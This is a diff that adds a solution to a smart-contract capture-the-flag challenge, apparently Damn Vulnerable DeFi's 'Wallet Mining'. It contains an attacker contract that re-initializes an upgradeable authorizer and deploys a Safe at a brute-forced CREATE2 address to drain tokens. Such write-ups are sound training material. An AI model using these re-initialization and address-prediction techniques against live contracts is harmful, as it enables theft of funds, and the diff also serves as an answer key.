@@ -157,7 +157,55 @@ contract WalletMiningChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_walletMining() public checkSolvedByPlayer {
-        
+        address[] memory owners = new address[](1);
+        owners[0] = user;
+
+        bytes memory initializer = abi.encodeCall(
+            Safe.setup,
+            (owners, 1, address(0), "", address(0), address(0), 0, payable(address(0)))
+        );
+
+        uint256 saltNonce;
+        address predicted;
+        bytes32 proxyInitCodeHash = keccak256(bytes.concat(proxyFactory.proxyCreationCode(), abi.encode(address(singletonCopy))));
+
+        while (predicted != USER_DEPOSIT_ADDRESS) {
+            predicted = vm.computeCreate2Address(
+                keccak256(bytes.concat(keccak256(initializer), bytes32(saltNonce))),
+                proxyInitCodeHash,
+                address(proxyFactory)
+            );
+            unchecked {
+                ++saltNonce;
+            }
+        }
+
+        unchecked {
+            --saltNonce;
+        }
+
+        bytes memory transferData = abi.encodeCall(token.transfer, (user, DEPOSIT_TOKEN_AMOUNT));
+
+        vm.etch(USER_DEPOSIT_ADDRESS, type(Safe).runtimeCode);
+        bytes32 txHash = Safe(payable(USER_DEPOSIT_ADDRESS)).getTransactionHash(
+            address(token), 0, transferData, Enum.Operation.Call, 0, 0, 0, address(0), payable(address(0)), 0
+        );
+        vm.etch(USER_DEPOSIT_ADDRESS, hex"");
+
+        (uint8 v, bytes32 r, bytes32 s) = vm.sign(userPrivateKey, txHash);
+        bytes memory signature = bytes.concat(r, s, bytes1(v));
+
+        new WalletMiningAttacker(
+            USER_DEPOSIT_ADDRESS,
+            address(authorizer),
+            address(walletDeployer),
+            initializer,
+            saltNonce,
+            address(token),
+            transferData,
+            signature,
+            ward
+        );
     }
 
     /**
@@ -168,7 +216,7 @@ contract WalletMiningChallenge is Test {
         assertNotEq(address(walletDeployer.cook()).code.length, 0, "No code at factory address");
 
         // Safe copy account must have code
-        assertNotEq(walletDeployer.cpy().code.length, 0, "No code at copy address");
+        assertNotEq(walletDeployer.cpy().code.length, 0, "No copy code");
 
         // Deposit account must have code
         assertNotEq(USER_DEPOSIT_ADDRESS.code.length, 0, "No code at user's deposit address");
@@ -188,5 +236,33 @@ contract WalletMiningChallenge is Test {
 
         // Player sent payment to ward
         assertEq(token.balanceOf(ward), initialWalletDeployerTokenBalance, "Not enough tokens in ward's account");
+    }
+}
+
+contract WalletMiningAttacker {
+    constructor(
+        address depositAddress,
+        address authorizer,
+        address walletDeployer,
+        bytes memory initializer,
+        uint256 saltNonce,
+        address token,
+        bytes memory transferData,
+        bytes memory signature,
+        address ward
+    ) {
+        address[] memory wards = new address[](1);
+        wards[0] = address(this);
+        address[] memory aims = new address[](1);
+        aims[0] = depositAddress;
+
+        AuthorizerUpgradeable(authorizer).init(wards, aims);
+        WalletDeployer(walletDeployer).drop(depositAddress, initializer, saltNonce);
+
+        DamnValuableToken(token).transfer(ward, DamnValuableToken(token).balanceOf(address(this)));
+
+        Safe(payable(depositAddress)).execTransaction(
+            token, 0, transferData, Enum.Operation.Call, 0, 0, 0, address(0), payable(address(0)), signature
+        );
     }
 }
